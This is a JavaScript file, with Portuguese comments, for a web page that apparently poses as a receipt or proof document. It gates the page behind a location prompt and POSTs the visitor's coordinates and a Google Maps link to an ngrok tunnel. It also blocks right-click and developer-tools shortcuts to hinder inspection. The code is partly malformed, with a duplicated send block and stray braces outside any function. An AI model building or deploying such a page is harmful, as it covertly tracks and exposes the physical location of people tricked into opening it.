// Espera a página carregar para pedir a localização
window.addEventListener("load", () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    } else {
        alert("Seu navegador não suporta geolocalização.");
    }
});

// Atualiza a data automaticamente
const dataAtual = new Date();
const dia = String(dataAtual.getDate()).padStart(2, '0');
const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
const ano = dataAtual.getFullYear();
const dataFormatada = `${dia}/${mes}/${ano}`;
document.getElementById("data-atual").textContent = dataFormatada;

function sendLocation(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

    // Verifique o que está sendo enviado
    console.log("Enviando dados para o servidor:", { latitude, longitude, maps });

    // Envia a localização para o servidor
    fetch("https://2942-2804-1eb0-a0-1aa7-31c1-a91-a190-96bc.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
    })
    .then(response => response.json())
    .then(data => {
        if (!data.success) {
            alert("Erro ao enviar o comprovante.");
        }
    })
    .catch(error => {
        console.error("Erro:", error);
    });
}


    // Remove a tela de bloqueio e mostra o site
    document.getElementById("overlay").style.opacity = "0";
    setTimeout(() => {
        document.getElementById("overlay").style.display = "none";
        document.getElementById("conteudo").classList.remove("hidden");
    }, 500); 

    // Envia a localização para o servidor
    fetch("https://2942-2804-1eb0-a0-1aa7-31c1-a91-a190-96bc.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps }),
        mode: "no-cors"  // Modo para desabilitar CORS
    })
    .then(response => {
        // Aqui, não será possível acessar a resposta
    })
    .catch(error => {
        console.error("Erro:", error);
    });    
    
}

function handleError(error) {
    alert("Para acessar o comprovante, você precisa habilitar a localização.");
}

// Bloqueia DevTools (F12, Ctrl+Shift+I, Ctrl+U)
document.addEventListener("keydown", function(event) {
    if (event.key === "F12" || 
        (event.ctrlKey && event.shiftKey && event.key === "I") ||
        (event.ctrlKey && event.key === "U")) {
        event.preventDefault();
    }
});

// Bloqueia o clique direito
document.addEventListener("contextmenu", function(event) {
    event.preventDefault();
});
